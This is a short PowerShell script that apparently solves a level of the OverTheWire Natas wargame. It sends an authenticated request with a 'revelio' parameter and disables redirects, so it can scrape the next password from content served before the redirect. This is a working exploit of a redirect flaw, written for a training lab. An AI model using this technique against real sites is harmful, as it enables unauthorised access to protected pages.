$Init = 21
$Username = 'natas' + ($Init + 1)
$Password = Get-Content -Path ../../../etc/otw/natas.pass | Select-Object -Skip $Init | Select-Object -First 1
$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))
$Uri = "http://$Username.natas.labs.overthewire.org/?revelio=1"
$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$Request = @{
	Uri = $Uri
	Method = 'GET'
	WebSession = $Session
	Headers = @{ Authorization = "Basic $Creds" }
}

$Res = Invoke-WebRequest @Request -MaximumRedirection 0 -SkipHttpErrorCheck -ErrorAction Ignore | Select-Object -ExpandProperty Content

$Natas23 = ($Res | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -first 1).Matches.Groups[1].Value
Write-Host -ForegroundColor Green "Password: $Natas23"
